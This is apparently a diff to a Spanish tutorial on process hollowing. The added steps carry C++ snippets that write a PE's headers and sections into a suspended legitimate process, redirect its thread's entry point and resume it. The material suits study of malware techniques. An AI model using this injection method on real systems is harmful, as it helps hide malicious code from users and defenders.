@@ -1,4 +1,4 @@
-# Antes que nada , debemos saber lo siguiente
+## Antes que nada , debemos saber lo siguiente
 
 1. **Trabajaremos con archivos PE de Windows**
 2. **Hablaremos de MS-DOS y DOS**:
@@ -171,4 +171,77 @@ Deberemos asignar memoria en nuestro "hueco" utilizando [VirtualAllocEx](https:/
         MEM_COMMIT | MEM_RESERVE,
         PAGE_EXECUTE_READWRITE
     );
+```
+
+## 7. Escribir encabezados PE en el proceso legítimo
+
+Usamos [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) para escribir datos en el proceso remoto
+Copiamos todos los encabezados del PE (DOS, NT, tablas de secciones)
+Estos encabezados contienen el "mapa" o "esquema" que el sistema operativo necesita para entender la estructura del ejecutable
+
+``` cpp
+ if (!WriteProcessMemory(
+        processInfo.hProcess,
+        newBaseAddress,
+        sourceFileBytesBuffer,
+        sourceImageNTHeaders->OptionalHeader.SizeOfHeaders,
+        NULL
+    ))
+```
+
+## 8. Escribir secciones del PE en el proceso legítimo
+
+Copiamos cada sección del ejecutable (.text, .data, .rdata, etc.) a su ubicación correcta en memoria
+
+```cpp
+  PIMAGE_SECTION_HEADER sourceImageSectionHeader = (PIMAGE_SECTION_HEADER)(
+        (DWORD_PTR)sourceImageNTHeaders + sizeof(IMAGE_NT_HEADERS)
+        );
+
+    for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++) {
+        std::cout << "  - Escribiendo sección: " << sourceImageSectionHeader->Name << std::endl;
+
+        LPVOID sectionDestination = (LPVOID)(
+            (DWORD_PTR)newBaseAddress + sourceImageSectionHeader->VirtualAddress
+            );
+
+        LPVOID sectionSource = (LPVOID)(
+            (DWORD_PTR)sourceFileBytesBuffer + sourceImageSectionHeader->PointerToRawData
+            );
+
+        if (!WriteProcessMemory(
+            processInfo.hProcess,
+            sectionDestination,
+            sectionSource,
+            sourceImageSectionHeader->SizeOfRawData,
+            NULL
+        )) {
+            ErrorExit("No se pudo escribir una sección del PE");
+        }
+
+        sourceImageSectionHeader++;
+    }
+```
+## 9. Actualizar el contexto del hilo para apuntar al nuevo punto de entrada
+
+Modificamos el estado del hilo suspendido para que cuando continúe, comience a ejecutar nuestro código
+
+``` cpp
+    context.Rbx = (DWORD_PTR)newBaseAddress + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint;
+```
+
+## 10. Reanudar la ejecución del proceso
+
+Usamos ResumeThread para reanudar la ejecucion del proceso
+
+``` cpp
+ if (ResumeThread(processInfo.hThread) == -1)
+```
+
+Por ultimo, liberamos recursos usando [HeapFree](https://learn.microsoft.com/es-es/windows/win32/api/heapapi/nf-heapapi-heapfree) y [CloseHandle](https://learn.microsoft.com/es-es/windows/win32/api/handleapi/nf-handleapi-closehandle)
+
+``` cpp
+    HeapFree(GetProcessHeap(), 0, sourceFileBytesBuffer);
+    CloseHandle(processInfo.hProcess);
+    CloseHandle(processInfo.hThread);
 ```
